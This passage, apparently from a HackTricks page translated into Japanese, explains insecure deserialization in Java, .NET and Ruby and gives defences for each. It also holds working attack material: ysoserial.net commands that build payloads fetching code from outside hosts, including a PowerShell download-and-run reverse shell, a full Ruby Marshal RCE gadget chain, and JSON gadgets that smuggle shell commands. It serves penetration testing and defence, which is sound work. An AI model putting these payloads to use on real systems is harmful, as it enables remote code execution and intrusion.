public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**セキュリティ強化のためのJavaエージェントの使用**は、コードの修正が不可能な場合のフォールバックソリューションを提供します。この方法は主に**有害なクラスのブラックリスト化**に適用され、JVMパラメータを使用します：
```
-javaagent:name-of-agent.jar
```
動的にデシリアライズを保護する方法を提供し、即時のコード変更が実用的でない環境に最適です。

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)の例を確認してください。

**シリアライゼーションフィルターの実装**: Java 9では、**`ObjectInputFilter`**インターフェースを介してシリアライゼーションフィルターが導入され、デシリアライズされる前にシリアライズされたオブジェクトが満たすべき基準を指定するための強力なメカニズムを提供します。これらのフィルターは、グローバルにまたはストリームごとに適用でき、デシリアライズプロセスに対する詳細な制御を提供します。

シリアライゼーションフィルターを利用するには、すべてのデシリアライズ操作に適用されるグローバルフィルターを設定するか、特定のストリームのために動的に構成することができます。例えば:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**外部ライブラリを活用したセキュリティの強化**: **NotSoSerial**、**jdeserialize**、および**Kryo**などのライブラリは、Javaのデシリアライズを制御および監視するための高度な機能を提供します。これらのライブラリは、クラスのホワイトリストやブラックリストの作成、デシリアライズ前のシリアライズされたオブジェクトの分析、カスタムシリアライズ戦略の実装など、追加のセキュリティ層を提供できます。

- **NotSoSerial**は、信頼できないコードの実行を防ぐためにデシリアライズプロセスを傍受します。
- **jdeserialize**は、デシリアライズせずにシリアライズされたJavaオブジェクトを分析でき、潜在的に悪意のあるコンテンツを特定するのに役立ちます。
- **Kryo**は、速度と効率を重視した代替シリアライゼーションフレームワークで、セキュリティを強化できる構成可能なシリアライゼーション戦略を提供します。

### 参考文献

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- デシリアライズとysoserialのトーク: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- gadgetinspectorについてのトーク: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) とスライド: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec論文: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Javaと.NetのJSONデシリアライズ **論文:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** トーク: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) とスライド: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- デシリアライズのCVE: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDIインジェクション & log4Shell

**JNDIインジェクションとは何か、RMI、CORBA & LDAPを介してどのように悪用するか、log4shellをどのように悪用するか**（およびこの脆弱性の例）については、以下のページを参照してください:

{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Javaメッセージサービス

> **Javaメッセージサービス**（**JMS**）APIは、2つ以上のクライアント間でメッセージを送信するためのJavaメッセージ指向ミドルウェアAPIです。これは、プロデューサー–コンシューマー問題を処理するための実装です。JMSはJavaプラットフォーム、エンタープライズエディション（Java EE）の一部であり、Sun Microsystemsで開発された仕様によって定義されましたが、その後Javaコミュニティプロセスによって指導されています。これは、Java EEに基づくアプリケーションコンポーネントがメッセージを作成、送信、受信、および読み取ることを可能にするメッセージング標準です。これは、分散アプリケーションの異なるコンポーネント間の通信を緩く結合し、信頼性が高く非同期にします。（出典: [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)）。

### 製品

このミドルウェアを使用してメッセージを送信する製品はいくつかあります:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### 悪用

基本的に、**危険な方法でJMSを使用しているサービスが多数存在します**。したがって、これらのサービスにメッセージを送信するための**十分な権限**がある場合（通常は有効な資格情報が必要です）、**デシリアライズされる悪意のあるシリアライズオブジェクトを送信できる可能性があります**。\
これは、この悪用において、**そのメッセージを使用するすべてのクライアントが感染する**ことを意味します。

サービスが脆弱である場合（ユーザー入力を安全でない方法でデシリアライズしているため）、脆弱性を悪用するための有効なガジェットを見つける必要があることを忘れないでください。

ツール[**JMET**](https://github.com/matthiaskaiser/jmet)は、**既知のガジェットを使用してシリアライズされた悪意のあるオブジェクトを送信するためにこれらのサービスに接続して攻撃する**ために作成されました。これらのエクスプロイトは、サービスがまだ脆弱であり、使用されるガジェットのいずれかが脆弱なアプリケーション内に存在する場合に機能します。

### 参考文献

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMETトーク: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- スライド: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Netの文脈において、デシリアライズの悪用は、Javaで見られるものと同様の方法で動作し、ガジェットがオブジェクトのデシリアライズ中に特定のコードを実行するために悪用されます。

### フィンガープリンティング

#### ホワイトボックス

ソースコードを検査して、以下の出現を探すべきです:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

ユーザー制御下の変数によって型を決定できるシリアライザーに焦点を当てるべきです。

#### ブラックボックス

検索は、Base64エンコードされた文字列**AAEAAAD/////**または、サーバー側でデシリアライズされる可能性のある類似のパターンを対象とするべきです。これには、`TypeObject`や`$type`を含む**JSON**または**XML**構造が含まれる可能性がありますが、これに限定されません。

### ysoserial.net

この場合、ツール[**ysoserial.net**](https://github.com/pwntester/ysoserial.net)を使用して**デシリアライズの悪用を作成**できます。gitリポジトリをダウンロードしたら、Visual Studioなどを使用して**ツールをコンパイル**する必要があります。

**ysoserial.netがどのように悪用を作成するか**について学びたい場合は、[**ObjectDataProviderガジェット + ExpandedWrapper + Json.Netフォーマッターが説明されているこのページを確認してください**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)。

**ysoserial.net**の主なオプションは、**`--gadget`**、**`--formatter`**、**`--output`**、および**`--plugin`**です。

- **`--gadget`**は、悪用するガジェットを示すために使用されます（デシリアライズ中にコマンドを実行するために悪用されるクラス/関数を示します）。
- **`--formatter`**は、悪用をシリアライズする方法を示すために使用されます（ペイロードをデシリアライズするためにバックエンドが使用しているライブラリを知り、それを使用してシリアライズする必要があります）。
- **`--output`**は、悪用を**生**または**base64**エンコードで出力するかどうかを示すために使用されます。_注意してください、**ysoserial.net**はペイロードを**UTF-16LE**（Windowsでデフォルトで使用されるエンコーディング）を使用して**エンコード**しますので、生のペイロードを取得してLinuxコンソールからエンコードすると、悪用が正しく機能しない**エンコーディングの互換性の問題**が発生する可能性があります（HTB JSONボックスではペイロードはUTF-16LEとASCIIの両方で機能しましたが、これは常に機能するとは限りません）。_
- **`--plugin`**ysoserial.netは、ViewStateのような**特定のフレームワーク用の悪用を作成するためのプラグイン**をサポートしています。

#### 追加のysoserial.netパラメータ

- `--minify`は**小さなペイロード**を提供します（可能な場合）。
- `--raf -f Json.Net -c "anything"`これは、提供されたフォーマッター（この場合は`Json.Net`）で使用できるすべてのガジェットを示します。
- `--sf xml`は**ガジェット**（`-g`）を示すことができ、ysoserial.netは「xml」を含むフォーマッターを検索します（大文字と小文字を区別しません）。

**ysoserialの例**を使用して悪用を作成します:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** には、各エクスプロイトがどのように機能するかをよりよく理解するのに役立つ **非常に興味深いパラメータ** があります: `--test`\
このパラメータを指定すると、 **ysoserial.net** は **ローカルでエクスプロイトを試みます** ので、ペイロードが正しく機能するかどうかをテストできます。\
このパラメータは便利です。なぜなら、コードをレビューすると、次のようなコードの断片が見つかるからです (from [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
これは、エクスプロイトをテストするために、コードが [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) を呼び出すことを意味します。
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
**前のコードは作成されたエクスプロイトに対して脆弱です**。したがって、.Netアプリケーションで同様のものを見つけた場合、そのアプリケーションも脆弱である可能性があります。\
そのため、**`--test`**パラメータは、**どのコードのチャンクが**ysoserial.net**によって作成されるデシリアライズエクスプロイトに脆弱であるかを理解するのに役立ちます。**

### ViewState

[**.Netの\_\_ViewStateパラメータをエクスプロイトする方法についてのこのPOSTを見てください**](exploiting-__viewstate-parameter.md) **任意のコードを実行するために。** もしあなたが**被害者のマシンで使用されている秘密をすでに知っているなら、[**コードを実行する方法を知るためにこの投稿を読んでください**](exploiting-__viewstate-knowing-the-secret.md)**。**

### Prevention

.Netにおけるデシリアライズに関連するリスクを軽減するために：

- **データストリームがオブジェクトタイプを定義することを許可しない。** 可能な限り`DataContractSerializer`または`XmlSerializer`を利用してください。
- **`JSON.Net`の場合、`TypeNameHandling`を`None`に設定する：** `TypeNameHandling = TypeNameHandling.None`
- **`JavaScriptSerializer`を`JavaScriptTypeResolver`と共に使用しない。**
- **デシリアライズ可能なタイプを制限し、`System.IO.FileInfo`のような.Netタイプに内在するリスクを理解する。** これはサーバーファイルのプロパティを変更し、サービス拒否攻撃を引き起こす可能性があります。
- **リスクのあるプロパティを持つタイプに注意する。** 例えば、`System.ComponentModel.DataAnnotations.ValidationException`の`Value`プロパティは悪用される可能性があります。
- **攻撃者がデシリアライズプロセスに影響を与えないように、タイプのインスタンス化を安全に制御する。** これにより、`DataContractSerializer`や`XmlSerializer`でさえ脆弱になります。
- **`BinaryFormatter`および`JSON.Net`のためにカスタム`SerializationBinder`を使用してホワイトリスト制御を実装する。**
- **.Net内の既知の不安全なデシリアライズガジェットについて情報を得て、デシリアライザがそのようなタイプをインスタンス化しないようにする。**
- **インターネットアクセスのあるコードから潜在的にリスクのあるコードを隔離し、`System.Windows.Data.ObjectDataProvider`のような既知のガジェットを信頼できないデータソースにさらさないようにする。**

### **References**

- Javaと.NetのJSONデシリアライズに関する**論文：** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**、** トーク： [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) およびスライド： [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Rubyでは、シリアル化は**marshal**ライブラリ内の2つのメソッドによって行われます。最初のメソッドは**dump**として知られ、オブジェクトをバイトストリームに変換するために使用されます。このプロセスはシリアル化と呼ばれます。逆に、2番目のメソッド**load**は、バイトストリームをオブジェクトに戻すために使用され、このプロセスはデシリアル化と呼ばれます。

シリアル化されたオブジェクトを保護するために、**RubyはHMAC（Hash-Based Message Authentication Code）**を使用し、データの整合性と真正性を確保します。この目的のために使用されるキーは、いくつかの可能な場所のいずれかに保存されます：

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.Xの一般的なデシリアライズからRCEガジェットチェーン（詳細は** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**）**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
他のRCEチェーンを利用してRuby On Railsを攻撃する: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() メソッド

[**この脆弱性レポート**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/)で説明されているように、ユーザーのサニタイズされていない入力がrubyオブジェクトの`.send()`メソッドに到達すると、このメソッドはオブジェクトの**他の任意のメソッドを**任意のパラメータで呼び出すことを可能にします。

例えば、evalを呼び出し、次にrubyコードを第二パラメータとして渡すことで、任意のコードを実行することができます:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
さらに、**`.send()`** のパラメータのうち1つだけが攻撃者によって制御されている場合、前述の説明にあるように、**引数を必要としない**か、**デフォルト値**を持つオブジェクトの任意のメソッドを呼び出すことが可能です。\
これを行うために、**その要件を満たす興味深いメソッドを見つけるためにオブジェクトのすべてのメソッドを列挙する**ことが可能です。
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Rubyクラス汚染

[ここでRubyクラスを汚染し、悪用する方法を確認してください](ruby-class-pollution.md)。

### Ruby _json汚染

ボディにハッシュ化できない値（配列など）を送信すると、それらは`_json`という新しいキーに追加されます。しかし、攻撃者はボディに任意の値を持つ`_json`という値を設定することも可能です。例えば、バックエンドがパラメータの真偽をチェックし、その後`_json`パラメータを使用して何らかのアクションを実行する場合、認証バイパスが行われる可能性があります。

[Ruby _json汚染ページで詳細情報を確認してください](ruby-_json-pollution.md)。

### その他のライブラリ

この技術は[**このブログ記事から**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared)取得されました。

オブジェクトをシリアライズするために使用できる他のRubyライブラリがあり、それらは不安全なデシリアライズ中にRCEを得るために悪用される可能性があります。以下の表は、これらのライブラリのいくつかと、それがデシリアライズされる際に呼び出されるメソッドを示しています（基本的にRCEを得るために悪用する関数）：

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>ライブラリ</strong></td><td><strong>入力データ</strong></td><td><strong>クラス内のキックオフメソッド</strong></td></tr><tr><td>Marshal (Ruby)</td><td>バイナリ</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code>（クラスはハッシュ（マップ）にキーとして入れる必要があります）</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code>（クラスはハッシュ（マップ）にキーとして入れる必要があります）</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code>（クラスはハッシュ（マップ）にキーとして入れる必要があります）<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code>（[json_createに関するノートを参照](#table-vulnerable-sinks)）</td></tr></tbody></table>

基本的な例:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Ojを悪用しようとした場合、`hash`関数内で`to_s`を呼び出すガジェットクラスを見つけることができました。これにより、specが呼び出され、fetch_pathが呼び出され、ランダムなURLを取得することが可能になり、これらの種類の未サニタイズのデシリアライズ脆弱性の優れた検出器を提供しました。
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
さらに、前述の技術を使用すると、システムにフォルダーが作成されることがわかりました。これは、別のガジェットを悪用してこれを完全なRCEに変換するための要件です。
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
[**元の投稿**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared)で詳細を確認してください。

### ブートストラップキャッシング

実際にはデシリアライズの脆弱性ではありませんが、ブートストラップキャッシングを悪用してRailsアプリケーションから任意のファイル書き込みによるRCEを取得するための良いトリックです（完全な[元の投稿はこちら](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)を見つけてください）。

以下は、Bootsnapキャッシングを悪用して任意のファイル書き込み脆弱性を悪用するための記事で詳述された手順の短い要約です：

- 脆弱性と環境の特定

Railsアプリのファイルアップロード機能は、攻撃者が任意にファイルを書き込むことを許可します。アプリは制限付きで実行されます（Dockerの非ルートユーザーのため、tmpのような特定のディレクトリのみが書き込み可能）が、これによりBootsnapキャッシュディレクトリ（通常はtmp/cache/bootsnapの下）への書き込みが可能になります。

- Bootsnapのキャッシュメカニズムの理解

Bootsnapは、コンパイルされたRubyコード、YAML、およびJSONファイルをキャッシュすることでRailsの起動時間を短縮します。キャッシュファイルにはキャッシュキーヘッダー（Rubyバージョン、ファイルサイズ、mtime、コンパイルオプションなどのフィールドを含む）が含まれ、その後にコンパイルされたコードが続きます。このヘッダーはアプリの起動時にキャッシュを検証するために使用されます。

- ファイルメタデータの収集

攻撃者はまず、Railsの起動時に読み込まれる可能性のあるターゲットファイル（例えば、Rubyの標準ライブラリからのset.rb）を選択します。コンテナ内でRubyコードを実行することで、重要なメタデータ（RUBY_VERSION、RUBY_REVISION、サイズ、mtime、compile_optionなど）を抽出します。このデータは有効なキャッシュキーを作成するために不可欠です。

- キャッシュファイルパスの計算

BootsnapのFNV-1a 64ビットハッシュメカニズムを再現することで、正しいキャッシュファイルパスが決定されます。このステップにより、悪意のあるキャッシュファイルがBootsnapが期待する場所（例：tmp/cache/bootsnap/compile-cache-iseq/の下）に正確に配置されることが保証されます。

- 悪意のあるキャッシュファイルの作成

攻撃者は次のようなペイロードを準備します：

- 任意のコマンドを実行します（例えば、プロセス情報を表示するためにidを実行）。
- 再帰的な悪用を防ぐために、実行後に悪意のあるキャッシュを削除します。
- アプリケーションがクラッシュしないように元のファイル（例：set.rb）を読み込みます。

このペイロードはバイナリRubyコードにコンパイルされ、慎重に構築されたキャッシュキーのヘッダー（以前に収集したメタデータとBootsnapの正しいバージョン番号を使用）と連結されます。

- 上書きと実行のトリガー
任意のファイル書き込み脆弱性を使用して、攻撃者は計算された場所に作成したキャッシュファイルを書き込みます。次に、サーバーの再起動をトリガーします（Pumaによって監視されているtmp/restart.txtに書き込むことによって）。再起動中、Railsがターゲットファイルを要求すると、悪意のあるキャッシュファイルが読み込まれ、リモートコード実行（RCE）が発生します。

### Ruby Marshalの実践における悪用（更新）

信頼できないバイトが`Marshal.load`/`marshal_load`に到達するパスはすべてRCEシンクとして扱います。Marshalは任意のオブジェクトグラフを再構築し、マテリアライズ中にライブラリ/ジェムのコールバックをトリガーします。

- 最小限の脆弱なRailsコードパス：
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- 実際のチェーンで見られる一般的なガジェットクラス: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- ペイロードに埋め込まれた典型的な副作用マーカー（アンマーシャル中に実行される）:
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
実際のアプリでの出現場所:
- 歴史的に Marshal を使用している Rails キャッシュストアとセッションストア
- バックグラウンドジョブバックエンドとファイルバックオブジェクトストア
- バイナリオブジェクトブロブのカスタム永続化または輸送

産業化されたガジェット発見:
- コンストラクタ、`hash`、`_load`、`init_with`、またはアンマーシャル中に呼び出される副作用のあるメソッドを grep
- CodeQL の Ruby 不安全なデシリアライズクエリを使用してソース → シンクを追跡し、ガジェットを明らかにする
- 公開されたマルチフォーマット PoC (JSON/XML/YAML/Marshal) で検証

## 参考文献

- Trail of Bits – Marshal madness: A brief history of Ruby deserialization exploits: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/

{{#include ../../banners/hacktricks-training.md}}
